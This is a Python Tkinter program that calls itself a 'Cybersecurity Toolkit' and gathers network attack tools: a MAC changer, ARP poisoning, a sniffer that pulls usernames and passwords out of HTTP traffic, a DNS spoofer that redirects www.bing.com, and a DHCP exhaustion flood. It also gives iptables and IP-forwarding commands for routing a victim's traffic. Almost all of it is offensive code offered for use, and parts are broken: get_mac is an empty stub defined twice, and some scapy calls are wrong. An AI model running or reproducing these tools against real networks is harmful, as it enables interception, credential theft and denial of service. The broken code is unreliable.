#!/usr/bin/env python3
import os
import random
from PIL import Image, ImageTk
import subprocess
import argparse
from scapy.layers.http import HTTPRequest  # Ensure HTTPRequest is imported
import netfilterqueue  # Import the netfilterqueue for DNS Spoofing
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
import ipaddress
from time import sleep
import re
import time
import tkinter as tk
from tkinter import messagebox
import scapy.all as scapy



def generate_random_mac():
    """Generate a random MAC address."""
    mac = [0x02, 0x00, 0x00,  # Locally administered address
           random.randint(0x00, 0xFF),
           random.randint(0x00, 0xFF),
           random.randint(0x00, 0xFF)]
    return ":".join(f"{octet:02x}" for octet in mac)


def get_current_mac(interface):
    """Get the current MAC address of the specified interface."""
    try:
        ifconfig_result = subprocess.check_output(['ifconfig', interface]).decode('utf-8')
        mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result)
        if mac_address_search_result:
            return mac_address_search_result.group(0)
        else:
            print('[-] MAC address not found')
            return None
    except subprocess.CalledProcessError:
        print(f"[-] Could not read interface {interface}")
        return None


def change_mac(interface, new_mac):
    """Change the MAC address of the specified interface."""
    print(f"[+] Changing MAC address for {interface} to {new_mac}")
    subprocess.call(['ifconfig', interface, 'down'])
    subprocess.call(['ifconfig', interface, 'hw', 'ether', new_mac])
    subprocess.call(['ifconfig', interface, 'up'])


def mac_changer_gui():
    """Create a GUI to change MAC address."""
    def change_mac_address():
        interface = interface_entry.get()
        if not interface:
            messagebox.showerror("Error", "Please enter a network interface.")
            return

        choice = mac_choice_var.get()
        if choice == "1":  # Random MAC address
            new_mac = generate_random_mac()
        elif choice == "2":  # Custom MAC address
            new_mac = custom_mac_entry.get().strip()
            if not re.fullmatch(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", new_mac):
                messagebox.showerror("Error", "Invalid MAC address format.")
                return
        else:
            messagebox.showerror("Error", "Invalid choice. Please select a valid option.")
            return

        current_mac = get_current_mac(interface)
        print(f"Current MAC = {current_mac}")

        change_mac(interface, new_mac)

        current_mac = get_current_mac(interface)
        if current_mac == new_mac:
            messagebox.showinfo("Success", f"MAC address changed to {new_mac} on {interface}")
        else:
            messagebox.showerror("Error", "MAC address did not change successfully.")

    # MAC Changer GUI
    mac_window = tk.Toplevel(root)
    mac_window.title("MAC Changer")
    mac_window.geometry("400x350")

    tk.Label(mac_window, text="Network Interface (e.g., eth0, wlan0):", font=("Helvetica", 12)).pack(pady=5)
    interface_entry = tk.Entry(mac_window, font=("Helvetica", 12))
    interface_entry.pack(pady=5)

    mac_choice_var = tk.StringVar()
    mac_choice_var.set("1")  # Default choice: random MAC

    tk.Radiobutton(mac_window, text="Generate Random MAC", variable=mac_choice_var, value="1", font=("Helvetica", 12)).pack(pady=5)
    tk.Radiobutton(mac_window, text="Enter Custom MAC", variable=mac_choice_var, value="2", font=("Helvetica", 12)).pack(pady=5)

    custom_mac_label = tk.Label(mac_window, text="Enter MAC Address (format: xx:xx:xx:xx:xx:xx):", font=("Helvetica", 12))
    custom_mac_label.pack(pady=5)
    custom_mac_entry = tk.Entry(mac_window, font=("Helvetica", 12))
    custom_mac_entry.pack(pady=5)

    change_button = tk.Button(mac_window, text="Change MAC Address", command=change_mac_address, font=("Helvetica", 12), bg="green", fg="white")
    change_button.pack(pady=20)

def get_mac(ip):
    # Function to get MAC address of the target IP
    # Add your code here to get MAC address from IP (like using ARP requests)
    pass


def get_mac(ip):
    # Function to get MAC address of the target IP
    # Add your code here to get MAC address from IP (like using ARP requests)
    pass

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

def run_arp_poisoning_script():
    def start_arp_poisoning():
        target_ip = target_ip_entry.get()
        gateway_ip = gateway_ip_entry.get()

        if not target_ip or not gateway_ip:
            messagebox.showerror("Error", "Please enter both Target IP and Gateway IP.")
            return

        try:
            sent_packets_count = 0

            # Show the instruction message for iptables or nftables
            instruction_message = (
                "To ensure packets flow through your device, please run one of the following commands:\n\n"
                "For iptables:\n"
                "sudo iptables -I FORWARD -j NFQUEUE --queue-num 0\n\n"
                "For nftables:\n"
                "sudo nft add chain ip filter forward '{ type filter hook forward priority 0 ; }'\n"
                "sudo nft add rule ip filter forward counter queue num 0"
            )
            instruction_label.config(text=instruction_message)  # Update the instruction label text

            def spoofing_loop():
                nonlocal sent_packets_count
                try:
                    while True:
                        spoof(target_ip, gateway_ip)
                        spoof(gateway_ip, target_ip)
                        sent_packets_count += 2
                        status_label.config(text=f"[+] Packets sent: {sent_packets_count}")
                        status_label.update()
                        time.sleep(2)
                except KeyboardInterrupt:
                    restore(target_ip, gateway_ip)
                    restore(gateway_ip, target_ip)
                    status_label.config(text="[+] ARP tables restored.")

            spoofing_loop()
        except Exception as e:
            messagebox.showerror("Error", str(e))

    # ARP Poisoning GUI
    arp_window = tk.Toplevel(root)
    arp_window.title("ARP Poisoning")
    arp_window.geometry("400x400")
    note_label = tk.Label(arp_window, text=(
        "Note: To ensure packets flow through your device, please run one of the following commands:\n\n"
                "For iptables:\n"
                "sudo iptables -I FORWARD -j NFQUEUE --queue-num 0\n\n"
                "For nftables:\n"
                "sudo nft add chain ip filter forward '{ type filter hook forward priority 0 ; }'\n"
                "sudo nft add rule ip filter forward counter queue num 0"),
                          font=("Helvetica", 10, "italic"), fg="red")
    note_label.pack(pady=10)

    tk.Label(arp_window, text="Target IP:", font=("Helvetica", 12)).pack(pady=5)
    target_ip_entry = tk.Entry(arp_window, font=("Helvetica", 12))
    target_ip_entry.pack(pady=5)

    tk.Label(arp_window, text="Gateway IP:", font=("Helvetica", 12)).pack(pady=5)
    gateway_ip_entry = tk.Entry(arp_window, font=("Helvetica", 12))
    gateway_ip_entry.pack(pady=5)

    status_label = tk.Label(arp_window, text="", font=("Helvetica", 12))
    status_label.pack(pady=10)

    # Label for instructions
    instruction_label = tk.Label(arp_window, text="", font=("Helvetica", 10), fg="red")
    instruction_label.pack(pady=10)

    tk.Button(arp_window, text="Start", command=start_arp_poisoning, font=("Helvetica", 12), bg="green", fg="white").pack(pady=20)



# Packet Sniffing Functionality
def sniff(interface):
    """Sniff packets on the specified interface."""
    print(f"[*] Starting packet sniffing on interface: {interface}")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# Function to extract URL from an HTTP request
def get_url(packet):
    """Extract the URL from the HTTP Request."""
    return packet[scapy.HTTPRequest].Host.decode() + packet[scapy.HTTPRequest].Path.decode()

# Function to extract possible login information from raw packet data
def get_login_info(packet):
    """Extract possible login information from raw data."""
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        try:
            load = load.decode('utf-8', errors='ignore')  # Decode byte string
        except Exception:
            return None
        keywords = ['username', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load
    return None

# Function to process each sniffed packet
def process_sniffed_packet(packet):
    """Process each sniffed packet."""
    if packet.haslayer(scapy.HTTPRequest):
        url = get_url(packet)
        print(f'[+] HTTP Request >> {url}')

        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n[+] Possible Username / Password >> {login_info}\n\n')

# GUI function for starting and stopping packet sniffing
def run_packet_sniffer():
    sniffing_active = False  # Global flag to control sniffing

    def start_packet_sniffer():
        nonlocal sniffing_active
        interface = interface_entry.get()

        if not interface:
            messagebox.showerror("Error", "Please enter a network interface.")
            return

        try:
            sniffing_active = True  # Start sniffing
            # Start sniffing on the provided interface
            sniff(interface)
            status_label.config(text="Sniffing started...")
            start_button.config(state=tk.DISABLED)  # Disable the start button
            stop_button.config(state=tk.NORMAL)  # Enable stop button
        except PermissionError:
            messagebox.showerror("Error", "Permission denied. Please run the script with elevated privileges (e.g., sudo).")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def stop_packet_sniffer():
        nonlocal sniffing_active
        sniffing_active = False  # Stop sniffing
        scapy.sniff(stop_filter=True)  # Stop sniffing the packets
        status_label.config(text="Sniffing stopped.")
        start_button.config(state=tk.NORMAL)  # Enable start button again
        stop_button.config(state=tk.DISABLED)  # Disable stop button

    # Packet Sniffer GUI
    sniffer_window = tk.Toplevel(root)
    sniffer_window.title("Packet Sniffer")
    sniffer_window.geometry("400x350")

    tk.Label(sniffer_window, text="Network Interface (e.g., eth0, wlan0):", font=("Helvetica", 12)).pack(pady=5)
    interface_entry = tk.Entry(sniffer_window, font=("Helvetica", 12))
    interface_entry.pack(pady=5)

    start_button = tk.Button(sniffer_window, text="Start Sniffing", command=start_packet_sniffer, font=("Helvetica", 12), bg="green", fg="white")
    start_button.pack(pady=20)

    stop_button = tk.Button(sniffer_window, text="Stop Sniffing", command=stop_packet_sniffer, font=("Helvetica", 12), bg="red", fg="white", state=tk.DISABLED)
    stop_button.pack(pady=20)

    status_label = tk.Label(sniffer_window, text="", font=("Helvetica", 12))
    status_label.pack(pady=10)

    # Note about packet forwarding
    note_label = tk.Label(sniffer_window, text=(
        "Note: In order for packets to flow through your machine, you need to enable packet forwarding.\n"
        "Run: 'echo 1 > /proc/sys/net/ipv4/ip_forward' (Requires root privileges)."),
        font=("Helvetica", 10, "italic"), fg="red")
    note_label.pack(pady=10)
# DNS Spoofing Functionality
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()  # Decode to convert bytes to string
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.114")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

def run_dns_spoofer():
    def start_dns_spoofing():
        try:
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, process_packet)
            queue.run()
        except PermissionError:
            messagebox.showerror("Error", "Permission denied. Please run the script with elevated privileges (e.g., sudo).")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    dns_window = tk.Toplevel(root)
    dns_window.title("DNS Spoofer")
    dns_window.geometry("400x300")

    start_button = tk.Button(dns_window, text="Start DNS Spoofing", command=start_dns_spoofing, font=("Helvetica", 12), bg="green", fg="white")
    start_button.pack(pady=20)

# DHCP Exhaustion Functionality
def run_dhcp_exhaustion():
    def start_dhcp_exhaustion():
        try:
            conf.checkIPaddr = False
            network_input = network_input_entry.get()
            iface_input = iface_input_entry.get()

            try:
                # Validate and convert the network input into an IPv4Network object
                possible_ips = [str(ip) for ip in ipaddress.IPv4Network(network_input)]
            except ValueError:
                messagebox.showerror("Error", "Invalid network input. Please enter a valid CIDR network.")
                return

            for ip_add in possible_ips:
                bog_src_mac = RandMAC()
                broadcast = Ether(src=bog_src_mac, dst="ff:ff:ff:ff:ff:ff")
                ip = IP(src="0.0.0.0", dst="255.255.255.255")
                udp = UDP(sport=68, dport=67)
                bootp = BOOTP(op=1, chaddr=bog_src_mac)
                dhcp = DHCP(options=[("message-type", "discover"), ("requested_addr", ip_add), ("server-id", "192.168.1.249"), ('end')])

                pkt = broadcast / ip / udp / bootp / dhcp
                sendp(pkt, iface=iface_input, verbose=0)

                sleep(0.4)
                print(f"Sending packet - {ip_add} via interface {iface_input}")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    dhcp_window = tk.Toplevel(root)
    dhcp_window.title("DHCP Exhaustion")
    dhcp_window.geometry("400x300")

    tk.Label(dhcp_window, text="Network (e.g., 192.168.1.0/24):", font=("Helvetica", 12)).pack(pady=5)
    network_input_entry = tk.Entry(dhcp_window, font=("Helvetica", 12))
    network_input_entry.pack(pady=5)

    tk.Label(dhcp_window, text="Interface (e.g., eth0):", font=("Helvetica", 12)).pack(pady=5)
    iface_input_entry = tk.Entry(dhcp_window, font=("Helvetica", 12))
    iface_input_entry.pack(pady=5)

    start_button = tk.Button(dhcp_window, text="Start DHCP Exhaustion", command=start_dhcp_exhaustion, font=("Helvetica", 12), bg="green", fg="white")
    start_button.pack(pady=20)

# Main GUI
root = tk.Tk()
root.title("Cybersecurity Toolkit")
root.geometry("600x400")

# Welcome Page with Background Image
welcome_canvas = tk.Canvas(root, width=600, height=400)
welcome_canvas.pack(fill="both", expand=True)

background_image = Image.open("git_profile_picture.jpg")
background_image = background_image.resize((600, 400), resample=Image.LANCZOS)
background_photo = ImageTk.PhotoImage(background_image)

welcome_canvas.create_image(0, 0, image=background_photo, anchor="nw")

welcome_message = (
    "Step into the shadows of the digital world\u2014where we explore the art of ethical hacking, "
    "mastering MITM and malware crafting for education and innovation. "
    "Remember, with great power comes great responsibility."
)
welcome_canvas.create_text(
    300, 150,
    text=welcome_message,
    fill="white",
    font=("Helvetica", 14, "bold"),
    width=550,
    justify="center"
)

start_button = tk.Button(
    root,
    text="Start",
    command=lambda: open_toolkit(),
    font=("Helvetica", 12),
    bg="green",
    fg="white"
)
welcome_canvas.create_window(300, 300, anchor="center", window=start_button)

# Toolkit Frame
toolkit_frame = tk.Frame(root)

def open_toolkit():
    welcome_canvas.pack_forget()
    toolkit_frame.pack(fill="both", expand=True)

    # Create a canvas to display the background image
    toolkit_canvas = tk.Canvas(toolkit_frame, width=600, height=400)
    toolkit_canvas.pack(fill="both", expand=True)

    # Set the background image on the canvas
    toolkit_background = Image.open("Hackerwall.jpg")
    toolkit_background = toolkit_background.resize((600, 400), Image.LANCZOS)
    toolkit_photo = ImageTk.PhotoImage(toolkit_background)
    toolkit_canvas.create_image(0, 0, image=toolkit_photo, anchor="nw")

    # Keep reference to the background image so it doesn't get garbage collected
    toolkit_canvas.image = toolkit_photo

    # Add the text above the background
    label = tk.Label(toolkit_frame, text="Choose Your Tool", font=("Helvetica", 16, "bold"), fg="white", bg="black")
    label.place(relx=0.5, rely=0.1, anchor="center")  # Position it at the top center

    # Add buttons above the background image
    tk.Button(toolkit_frame, text="MAC Changer", command=mac_changer_gui, font=("Helvetica", 12), width=20).place(relx=0.5, rely=0.25, anchor="center")
    tk.Button(toolkit_frame, text="ARP Poisoning", command=run_arp_poisoning_script, font=("Helvetica", 12), width=20).place(relx=0.5, rely=0.35, anchor="center")
    tk.Button(toolkit_frame, text="Packet Sniffer", command=run_packet_sniffer, font=("Helvetica", 12), width=20).place(relx=0.5, rely=0.45, anchor="center")
    tk.Button(toolkit_frame, text="DNS Spoofer", command=run_dns_spoofer, font=("Helvetica", 12), width=20).place(relx=0.5, rely=0.55, anchor="center")
    tk.Button(toolkit_frame, text="DHCP Exhaustion", command=run_dhcp_exhaustion, font=("Helvetica", 12), width=20).place(relx=0.5, rely=0.65, anchor="center")


root.mainloop()


